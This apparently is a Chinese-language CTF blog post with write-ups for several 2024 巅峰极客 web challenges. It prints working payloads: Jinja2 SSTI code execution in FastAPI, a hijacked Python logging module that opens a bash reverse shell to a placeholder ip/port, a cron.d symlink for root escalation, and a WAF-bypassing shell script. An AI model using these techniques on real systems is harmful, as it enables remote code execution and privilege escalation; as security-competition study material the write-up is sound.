@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>巅峰极客2024部分题解 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Web" />
+  
+  <meta name="description" content="尽力了，自己还是太菜了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="巅峰极客2024部分题解">
+<meta property="og:url" content="http://example.com/posts/25143.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="尽力了，自己还是太菜了">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2024-08-18T02:43:50.000Z">
+<meta property="article:modified_time" content="2024-08-18T04:51:02.816Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg_winter.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/25143.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">巅峰极客2024部分题解</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-08-18T02:43:50.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-08-18</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~8.12K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/25143.html" class="leancloud_visitors" data-flag-title="巅峰极客2024部分题解">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1723956662816"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>尽力了，自己还是太菜了</p>
+<span id="more"></span>
+<h1><span id="encircling"> Encircling</span></h1>
+<p>普通小游戏，打赢即有flag，前端操作一下就行了。</p>
+<img src="/posts/undefined/1.png" class title="awa">
+<h1><span id="goldenhornking"> GoldenHornKing</span></h1>
+<h2><span id="非预期解"> 非预期解</span></h2>
+<p>我出的是非预期解。</p>
+<p>源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jinja2</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> fastapi.templating <span class="keyword">import</span> Jinja2Templates</span><br><span class="line"><span class="keyword">from</span> anyio <span class="keyword">import</span> fail_after, sleep</span><br><span class="line"><span class="comment"># jinja2==3.1.2</span></span><br><span class="line"><span class="comment"># uvicorn==0.30.5</span></span><br><span class="line"><span class="comment"># fastapi==0.112.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timeout_after</span>(<span class="params">timeout: <span class="built_in">int</span> = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">        @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">with</span> fail_after(timeout):</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">await</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">access = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">_base_path = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">t = Jinja2Templates(directory=_base_path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@timeout_after(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/calc&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@timeout_after(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ssti</span>(<span class="params">calc_req: <span class="built_in">str</span> </span>):</span><br><span class="line">    <span class="keyword">global</span> access</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">any</span>(char.isdigit() <span class="keyword">for</span> char <span class="keyword">in</span> calc_req)) <span class="keyword">or</span> (<span class="string">&quot;%&quot;</span> <span class="keyword">in</span> calc_req) <span class="keyword">or</span> <span class="keyword">not</span> calc_req.isascii() <span class="keyword">or</span> access:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad char&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        jinja2.Environment(loader=jinja2.BaseLoader()).from_string(<span class="string">f&quot;&#123;&#123;&#123;&#123; <span class="subst">&#123;calc_req&#125;</span> &#125;&#125;&#125;&#125;&quot;</span>).render(&#123;<span class="string">&quot;app&quot;</span>: app&#125;)</span><br><span class="line">        access = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fight&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+<p>去查一下就知道了，<code>jinja2.Environment(loader=jinja2.BaseLoader()).from_string(f&quot;&#123;&#123;&#123;&#123; &#123;calc_req&#125; &#125;&#125;&#125;&#125;&quot;).render(&#123;&quot;app&quot;: app&#125;)</code>就是<code>jinja2+fastapi</code>的ssti语句。也就是说我们这里就是打<code>fastapi+jinja2</code>的ssti。示例代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_root</span>(<span class="params">username=<span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line">    username = username <span class="keyword">or</span> <span class="string">&quot;Guest&quot;</span></span><br><span class="line">    Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Vulnerable Implementation</span></span><br><span class="line">    output = Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username + <span class="string">&quot;!&quot;</span>).render()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Safe Implementation</span></span><br><span class="line">    <span class="comment"># output = Jinja2.from_string(&quot;Welcome &#123;&#123; user_name &#125;&#125;!&quot;).render(user_name=username)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=output)</span><br></pre></td></tr></table></figure>
+<p>很像吧。</p>
+<p>但是这个题目有限制，无回显+access限制。<code>access</code>的存在使得我们每开启一次就只能打一次payload，如果一次不能成功就只能重启靶机。</p>
+<p>所以先本地测试，改成有回显的情况。哦对，还有过滤，过滤数字和<code>%</code>，差点忘了。</p>
+<p>本地测试发现不用<code>&#123;&#123;&#125;&#125;</code>包裹就能够打ssti了。</p>
+<p>测试payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum.__globals__.os.popen(&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>
+<p>有回显</p>
+<img src="/posts/undefined/2.jpg" class title="awa">
+<p>尝试反弹shell发现payload会带数字，dnslog curl不到。</p>
+<p>那现在就是指向一个无回显、不出网、只能打一次限制盲注的情况。</p>
+<p>这种情况最好的办法就是打内存马，要打内存马就只能找到添加路由的函数，欸，但是我没找到。</p>
+<p>我找的是另一条路，灵感来自于pyjail。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647">link_here</a></p>
+<img src="/posts/undefined/3.jpg" class title="awa">
+<p>看到这里灵感瞬间来了，我们lipsum也能够拿到exec，那就是说我们能够篡改任意一个函数。篡改哪个呢？答案不言而喻。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@timeout_after(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<p>很明显就是这个open，能够返回值显示的，这样不就有回显了吗？</p>
+<p>照猫画虎一下修改open，这里用的是lambda表达式，很好写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;open&#x27;]=lambda x,y: __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>本地测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;open&#x27;]=lambda x,y: __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>至于为什么用<code>popen</code>，很简单啊，因为还要调用一个<code>.read()</code>，我们平时做ssti不都是<code>popen('xxx').read()</code>吗，这不就相当于<code>popen('xxx').read()</code>吗</p>
+<img src="/posts/undefined/4.jpg" class title="awa">
+<p>本地测试成功。去远程环境打就可以了：</p>
+<img src="/posts/undefined/5.png" class title="awa">
+<h2><span id="预期解"> 预期解</span></h2>
+<p>Z3r4y师傅的解法，发现了<code>add_api_route</code>可以动态添加一个路由，那payload很简单了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc?calc_req=config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&#x27;app.add_api_route(&quot;/flag&quot;,lambda:__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read());&#x27;</span>,&#123;<span class="string">&quot;app&quot;</span>:app&#125;)</span><br></pre></td></tr></table></figure>
+
+<h1><span id="php-online"> php online</span></h1>
+<p>有点炸裂这题，源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, redirect, url_for, render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secrets.token_hex(<span class="number">16</span>)</span><br><span class="line">working_id = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">id</span>.isalnum() <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">id</span>) != <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;无效的ID&#x27;</span></span><br><span class="line">        session[<span class="string">&#x27;id&#x27;</span>] = <span class="built_in">id</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">f&#x27;/sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>):</span><br><span class="line">            os.popen(<span class="string">f&#x27;mkdir /sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span> &amp;&amp; chown www-data /sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span> &amp;&amp; chmod a+w /sandbox/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;sandbox&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;submit_id.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/sandbox&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;submit_code.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;no id&#x27;</span></span><br><span class="line">        user_id = session[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_id <span class="keyword">in</span> working_id:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;task is still running&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            working_id.append(user_id)</span><br><span class="line">            code = request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">            os.popen(<span class="string">f&#x27;cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()</span><br><span class="line">            os.popen(<span class="string">f&#x27;sudo -u www-data cp /app/init.py /sandbox/<span class="subst">&#123;user_id&#125;</span>/init.py &amp;&amp; cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u www-data python3 init.py&#x27;</span>).read()</span><br><span class="line">            os.popen(<span class="string">f&#x27;rm -rf /sandbox/<span class="subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>).read()</span><br><span class="line">            </span><br><span class="line">            php_file = <span class="built_in">open</span>(<span class="string">f&#x27;/sandbox/<span class="subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            php_file.write(code)</span><br><span class="line">            php_file.close()</span><br><span class="line"></span><br><span class="line">            result = os.popen(<span class="string">f&#x27;cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u nobody php phpcode&#x27;</span>).read()</span><br><span class="line">            os.popen(<span class="string">f&#x27;cd /sandbox/<span class="subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()</span><br><span class="line">            working_id.remove(user_id)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>逻辑就是nobody权限用户去执行php代码，nobody的权限比www-data还低。</p>
+<p>这里刚开始看到<code>sudo -u www-data python3 init.py</code>，用<code>www-data</code>执行的<code>init.py</code>，便想去尝试读一下这个文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /app/init.py&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现只是一段很普通的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger.info(<span class="string">&#x27;Code execution start&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后没了，看了很久都没看出来。</p>
+<p>比完了问了一下烧卖的师傅们，gztime师傅说用的是条件竞争做的。呜呜，当时没看出来。</p>
+<p>在哪竞争呢？其实就是这个<code>sudo -u www-data python3 init.py</code></p>
+<p>它import了logging。在python里同目录下的同名py文件优先于第三方库文件。也就是说我们如果在sandbox里也有一个<code>logging.py</code>，那么它就会先调用我们的<code>logging.py</code>文件。</p>
+<p>很显然我们不能够直接将自己的<code>logging.py</code>文件放到<code>sandbox</code>里，因为每次运行都会删掉沙箱里的所有东西。我们先在tmp目录下写，然后sh脚本调用将其循环复制竞争即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;__import__(&#x27;os&#x27;).popen(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;) &gt; /tmp/logging.py\&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;while true;do&#x27; &gt;&gt; /tmp/a.sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;    cp /tmp/logging.py /sandbox/sandboxname/logging.py&#x27; &gt;&gt; /tmp/a.sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;done&#x27;&gt;&gt;/tmp/a.sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;chmod +x /tmp/a.sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;sh /tmp/a.sh&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样能够不断将logging.py复制到<code>sandboxname</code>目录下，也就是一个沙箱内，此时只需要不断在该沙箱内触发<code>sudo -u www-data python3 init.py</code>即可，随便执行触发。这样能够获取到<code>www-data</code>权限的shell。但是还不够，flag是只有root权限才能够拿到的，我们还得想办法到root权限。</p>
+<p>suid没有有用的信息，uname -a也没有有用的信息。但是<code>ps -aux</code>会发现开着定时任务。此时我们要想办法往定时任务里写东西。利用沙箱会<code>cd</code>进沙箱目录然后写<code>phpcode</code>文件的操作，可以将沙箱和定时任务目录软链接起来，然后写的时候就会写入定时任务里了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/cron.d /sandbox/xxxxxxxx</span><br></pre></td></tr></table></figure>
+<p>然后传定时任务格式的payload就行了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* * * * * root cat /flag &gt; /tmp/flag</span><br><span class="line"># &lt;?php sleep(10000);?&gt;</span><br></pre></td></tr></table></figure>
+<p><code># &lt;?php sleep(10000);?&gt;</code>这里是防止phpcode被删的太快，保证能够写到计划任务里并且执行。最后到<code>/tmp/flag</code>下读flag就可以了</p>
+<h1><span id="admin_test"> admin_test</span></h1>
+<p>这个题也没看，第二天感觉一眼看上去很简单。简单说下思路吧，<code>dirsearch</code>扫到<code>admin.html</code>。是一个上传并且执行命令的界面，传了发现waf，慢慢扫会发现限制了<code>t * . /</code>，跟ctfshow那个临时文件执行差不多：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line"></span><br><span class="line">. /t*/*</span><br></pre></td></tr></table></figure>
+<p>最后利用find提权就可以了。</p>
+<h1><span id="ez_java未解出"> ez_java(未解出)</span></h1>
+<p>不懂，考的是jdk17下的cb链。去看了<code>rwctf</code>的<code>oldsystem</code>和<code>n1ctf junior</code>的<code>derby plus</code>，那两个一个是低版本下的cb链，一个是高版本下的cb链，都指向了<code>ldapAttribute</code>这条链子，打的是jndi。但是将payload发过去之后发现它还有waf，过滤了<code>org.apache</code>类，有点不会打了。</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
